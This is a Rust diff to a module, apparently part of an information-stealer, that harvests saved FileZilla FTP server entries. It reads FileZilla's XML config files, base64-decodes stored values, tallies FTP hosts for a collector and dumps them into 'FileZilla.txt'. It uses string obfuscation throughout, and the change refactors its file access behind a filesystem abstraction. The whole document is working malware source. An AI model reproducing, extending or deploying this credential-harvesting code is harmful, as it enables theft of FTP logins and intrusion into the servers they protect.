@@ -3,17 +3,19 @@ use alloc::format;
 use alloc::string::{String, ToString};
 use alloc::vec::Vec;
 use collector::{Collector, Software};
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::{FileSystem, WriteTo};
 use obfstr::obfstr as s;
 use tasks::Task;
 use utils::base64::base64_decode;
-use utils::path::{Path, WriteToFile};
-use windows::Data::Xml::Dom::XmlDocument;
 use windows::core::HSTRING;
+use windows::Data::Xml::Dom::XmlDocument;
 
 pub(super) struct FileZillaTask;
 
-impl<C: Collector> Task<C> for FileZillaTask {
-    fn run(&self, parent: &Path, collector: &C) {
+impl<C: Collector, F: FileSystem> Task<C, F> for FileZillaTask {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let servers = collect_servers();
 
         if servers.is_empty() {
@@ -51,7 +53,7 @@ impl<C: Collector> Task<C> for FileZillaTask {
             .increase_ftp_hosts_by(servers.len());
 
         let servers = servers.join("\n\n");
-        let _ = servers.write_to(parent / s!("FileZilla.txt"));
+        let _ = servers.write_to(filesystem, parent / s!("FileZilla.txt"));
     }
 }
 
@@ -68,7 +70,7 @@ fn collect_servers() -> Vec<Server> {
     ];
 
     for (path, servers_node) in paths {
-        if let Some(servers) = collect_servers_from_path(&path, servers_node) {
+        if let Some(servers) = collect_servers_from_path(&StorageFileSystem, &path, servers_node) {
             result.extend(servers)
         }
     }
@@ -76,17 +78,23 @@ fn collect_servers() -> Vec<Server> {
     result
 }
 
-fn collect_servers_from_path<S>(path: &Path, servers_node: S) -> Option<Vec<Server>>
+fn collect_servers_from_path<F, S>(
+    filesystem: &F,
+    path: &Path,
+    servers_node: S,
+) -> Option<Vec<Server>>
 where
     S: AsRef<str>,
+    F: FileSystem,
 {
     let mut result: Vec<Server> = Vec::new();
 
-    if !path.is_exists() {
+    if !filesystem.is_exists(path) {
         return None;
     }
 
-    let bytes = path.read_file();
+    let bytes = filesystem.read_file(path);
+
     if bytes.is_err() {
         return None;
     }
